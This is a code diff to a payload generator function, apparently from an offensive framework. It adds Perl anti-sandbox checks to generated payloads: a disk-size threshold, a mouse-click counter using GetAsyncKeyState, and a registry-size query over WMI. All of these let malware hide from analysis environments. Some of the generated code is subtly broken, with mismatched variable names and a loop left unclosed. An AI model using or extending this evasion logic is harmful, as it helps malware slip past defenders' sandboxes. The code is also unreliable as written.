@@ -443,11 +443,61 @@ def senecas_games(evasion_payload):
 
             min_disksize = evasion_helpers.randomString()
             file_object = evasion_helpers.randomString()
+            real_disksize = evasion_helpers.randomString()
 
             check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
-            check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = 50;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = ' + evasion_payload.required_options['DISKSIZE'][0] + ';\n'
             check_code += '\t' * num_tabs_required + 'my $' + file_object + ' = Win32::OLE->CreateObject("Scripting.FileSystemObject");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + real_disksize + ' = $' + file_object + '->GetDrive("C:")->{TotalSize}/1073741824.0;\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + min_disksize + ' > $' + real_disksize + ') {\n'
 
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["NUMCLICKS"][0].lower() != 'x':
+
+            perl_min_clicks = evasion_helpers.randomString()
+            perl_key_state = evasion_helpers.randomString()
+            click_count = evasion_helpers.randomString()
+            perl_leftclick = evasion_helpers.randomString()
+            perl_rightclick = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'my $' + perl_min_clicks + ' = ' + evasion_payload.required_options["NUMCLICKS"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + perl_key_state + ' = new Win32::API("user32", "GetAsyncKeyState", +"I", "N");\n'
+            check_code += '\t' * num_tabs_required + 'my $' + click_count + ' = 0;\n'
+            check_code += '\t' * num_tabs_required + 'while ($' + click_count + ' < $' + perl_min_clicks + ') {\n'
+            check_code += '\t' * num_tabs_required + '\tmy $' + perl_leftclick + ' = $getAsyncKeyState->Call(1);\n'
+            check_code += '\t' * num_tabs_required + '\tmy $' + perl_rightclick + ' = $getAsyncKeyState->Call(2);\n'
+            check_code += '\t' * num_tabs_required + '\tif ($' + perl_leftclick + ') {\n'
+            check_code += '\t' * num_tabs_required + '\t\t++$' + click_count + ';\n'
+            check_code += '\t' * num_tabs_required + '\t}\n'
+            check_code += '\t' * num_tabs_required + '\tif ($' + perl_rightclick + ') {\n'
+            check_code += '\t' * num_tabs_required + '\t\t++$' + click_count + ';\n'
+            check_code += '\t' * num_tabs_required + '\t}\n'
+            check_code += '\t' * num_tabs_required + '\tsleep(2);\n'
+            check_code += '\t' * num_tabs_required + 'if (1) {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["REGSIZE"][0].lower() != 'x':
+
+            reg_mb_size = evasion_helpers.randomString()
+            perl_wmi = evasion_helpers.randomString()
+            reg_dump = evasion_helpers.randomString()
+            reg_size = evasion_helpers.randomString()
+            perl_reg_obj = evasion_helpers.randomString()
+
+            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_mb_size + ' = ' + evasion_payload.required_options["REGSIZE"][0] + ';\n'
+            check_code += '\t' * num_tabs_required + 'my $' + perl_wmi + ' = Win32::OLE->GetObject("winmgmts:\\\\\\\\localhost\\\\root\\\\CIMV2") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_dump + ' = $' + perl_wmi + '->ExecQuery("SELECT CurrentSize from Win32_Registry") or die;\n'
+            check_code += '\t' * num_tabs_required + 'my $' + reg_size + ';\n'
+            check_code += '\t' * num_tabs_required + 'foreach my $' + perl_reg_obj + ' (in $' + reg_dump + ') { $' + reg_size + ' = $regObj->CurrentSize; }\n'
+            check_code += '\t' * num_tabs_required + 'if ($' + reg_size + ' > $' + reg_mb_size + ') {\n'
+
+            # Add a tab for this check
+            num_tabs_required += 1
 
         if evasion_payload.required_options["USERNAME"][0].lower() != "x":
 
